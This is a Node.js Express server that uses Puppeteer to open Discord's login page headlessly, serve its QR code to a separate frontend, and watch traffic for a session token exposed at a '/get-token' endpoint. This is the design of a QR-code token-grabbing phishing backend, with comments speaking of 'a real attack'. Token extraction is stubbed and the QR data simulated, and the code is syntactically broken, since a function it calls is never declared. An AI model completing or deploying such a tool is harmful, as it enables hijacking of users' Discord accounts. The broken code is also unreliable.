const express = require('express');
const puppeteer = require('puppeteer');
const cors = require('cors');
const app = express();

app.use(cors());

let qrCodeData = null;
let capturedToken = null;

// This function runs the hidden browser
const browser = await puppeteer.launch({
    headless: "new",
    executablePath: '/usr/bin/chromium', // THIS LINE IS MANDATORY
    args: [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage'
    ]
});
    const page = await browser.newPage();
    
    try {
        await page.goto('https://discord.com/login', { waitUntil: 'networkidle2' });

        // Wait for the QR code to appear in the DOM
        // Note: Discord changes their CSS classes often. 
        // This is a logic template.
        await page.waitForSelector('canvas', { timeout: 60000 });

        // In a real implementation, we would intercept the 
        // WebSocket traffic to grab the QR string and the Token.
        // For this template, we simulate the data flow.
        
        console.log("Discord session started. Waiting for QR/Token...");
        
        // SIMULATION: In a real attack/test, you'd extract the 
        // actual QR from the canvas or WebSocket.
        qrCodeData = "SIMULATED_QR_DATA_FOR_TESTING"; 

        // Listen for the token in the network requests
        page.on('request', request => {
            if (request.url().includes('token') || request.url().includes('gateway')) {
                // This is where the magic happens
                // capturedToken = extracted_token;
            }
        });

    } catch (e) {
        console.error("Puppeteer Error:", e);
    }
}

// Start the browser immediately when the server starts
startDiscordSession();

// Endpoint for your Vercel Frontend
app.get('/get-qr', (req, res) => {
    if (qrCodeData) {
        res.json({ qr: qrCodeData });
    } else {
        res.status(503).json({ error: 'QR not ready' });
    }
});

// Endpoint to check if token was caught
app.get('/get-token', (req, res) => {
    if (capturedToken) {
        res.json({ token: capturedToken });
    } else {
        res.json({ token: null });
    }
});

app.get('/', (req, res) => res.send('Backend Running'));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server on port ${PORT}`));
